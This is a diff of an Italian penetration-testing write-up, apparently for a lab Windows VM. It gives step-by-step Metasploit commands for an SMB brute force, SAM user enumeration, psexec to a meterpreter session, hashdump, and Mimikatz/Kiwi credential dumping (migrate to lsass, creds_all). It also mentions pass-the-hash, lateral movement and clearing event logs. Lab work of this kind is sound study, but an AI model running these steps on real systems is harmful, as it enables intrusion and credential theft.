@@ -70,9 +70,9 @@ Andiamo ad eseguire l'exploit seguendo questa procedura:
 
 **7)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.
 
-**RISULTATO**: Abbiamo ottenuto delle credenziali di accesso SMB.
+**RISULTATO**: Abbiamo ottenuto delle credenziali di accesso SMB che in questo caso sono anche quelle di windows.
 
-**Cosiderazioni**: Questo attacco potrebbe generare un sacco di rumore, in quanto verrà visualizzato come un tentativo di accesso non riuscito nei registri eventi. Penseremo in seguito a come fare pulizia.
+**Cosiderazioni**: Questo attacco potrebbe generare un sacco di rumore, in quanto verrà visualizzato come un tentativo di accesso non riuscito nei registri eventi. In seguito, penseremo a come pulire questi registri.
 
 ![The Markdown Mark](images/exploit1.PNG)    ![The Markdown Mark](images/exploit2.PNG) 
 
@@ -82,7 +82,7 @@ Andiamo ad eseguire l'exploit seguendo questa procedura:
 
 
 ## Determinazione utenti locali Sam
- Utilizzando le credenziali SMB, raccogliamo ulteriori informazioni sulla vittima utilizzando un altro exploit ad esempio per determinare gli utenti locali della macchina.
+Utilizzando le credenziali SMB, abbiamo eseguito un altro exploit per determinare gli utenti locali della macchina bersaglio. Questo ci ha permesso di verificare se gli utenti di SMB coincidessero con gli utenti locali di Windows.
  
 **1)Aprire Metasploit**: Aprire il terminale e digitare il comando ```msfconsole``` per avviare Metasploit.
 
@@ -96,7 +96,7 @@ Andiamo ad eseguire l'exploit seguendo questa procedura:
 
 **6)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.
 
-**RISULTATO**:Abbiamo ottenuto gli utenti locali SAM che possiamo salvare in un file *user.txt*.
+**RISULTATO**:Abbiamo ottenuto gli utenti locali SAM che possiamo salvare in un file , e si vede che c'è corrispondenza con l'utente "vagrant" di  SMB.
 
 #### Riferimenti:
 + https://www.hackingarticles.in/smb-penetration-testing-port-445/
@@ -106,7 +106,7 @@ Utilizzando le credenziali ottenute, abbiamo sfruttato un altro exploit per eseg
 
 **1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.
 
-**2)Caricare il modulo SMB enumusers Scanner**: Una volta aperto Metasploit, caricare il modulo: ```exploit/windows/smb/psexec```.
+**2)Caricare il modulo**: Una volta aperto Metasploit, digitare: ``` use exploit/windows/smb/psexec```.
 
 **3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```
 
@@ -114,7 +114,7 @@ Utilizzando le credenziali ottenute, abbiamo sfruttato un altro exploit per eseg
 
 **5)Impostare la password**: ```set SMBPass vagrant```.
 
-**6)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.
+**6)Eseguire l'exploit**: Avviare l'attacco utilizzando il comando: ```exploit```.
 
 **RISULTATO**: Abbiamo ottenuto una sessione meterpeter sulla macchina.
 
@@ -128,15 +128,14 @@ Digitare  ```hashdump``` nella sessione meterpreter e salvare le password su fil
 Posso conservare queste password per tentare di indovinare le password offline e, eventualmente, effettuare un movimento laterale o accedere a qualche sito web. Inoltre, posso conservare queste credenziali per tentare un attacco pass-the-hash.
 
 ## Utilizzo di Kiwi (mimikatz)
-Successivamente, abbiamo impiegato Mimikatz, uno strumento avanzato di post-exploitation, per estrarre ulteriori dati sensibili e credenziali dalla memoria del sistema compromesso.
 Successivamente, abbiamo utilizzato Mimikatz, uno strumento avanzato di post-exploitation, per estrarre ulteriori dati sensibili e credenziali dalla memoria del sistema compromesso.
-Questo tool consente di recuperare tutte le password in formato hash, un'operazione che avevamo già eseguito in precedenza.Pertanto, il nostro obiettivo ora è recuperare le password di tutti gli utenti che si sono autenticati da quando la macchina è stata accesa l'ultima volta, senza dover procedere con l'estrazione offline delle password.
+Questo tool consente di recuperare tutte le password in formato hash, un'operazione che avevamo già eseguito in precedenza. Pertanto, il nostro obiettivo ora è recuperare le password in chiaro di tutti gli utenti che si sono autenticati da quando la macchina è stata accesa l'ultima volta, senza dover procedere con l'estrazione offline delle password.
 
-**1)Spostarsi nel processo**: Digitare ```migrate 'pid scelto'``` nella sessione meterpeter. (es scegliamo il pid del processo lssa che ha privilegi elevati).
+**1)Elencare processi**: Digitare ```ps``` nella sessione meterpeter per visualizzare tutti i processi attivi e sceglierne uno con i giusti privilegi.
 
-**2)Aprire Mimikatz**: Digitare ```load kiwi``` nella sessione meterpeter.
+**2)Spostarsi nel processo**: Digitare ```migrate 'pid scelto'``` nella sessione meterpeter. (es scegliamo il pid del processo lssa che ha privilegi elevati).
 
-**3)Elencare processi**: Digitare ```ps``` nella sessione meterpeter per visualizzare tutti i processi attivi e sceglierne uno con i giusti privilegi.
+**3)Aprire Mimikatz**: Digitare ```load kiwi``` nella sessione meterpeter.
 
 **4)Rubare le credenziali**: Digitare ```creds_all``` nella sessione meterpeter per ottenere le credenziali disponibili degli utenti che si sono loggati.
 
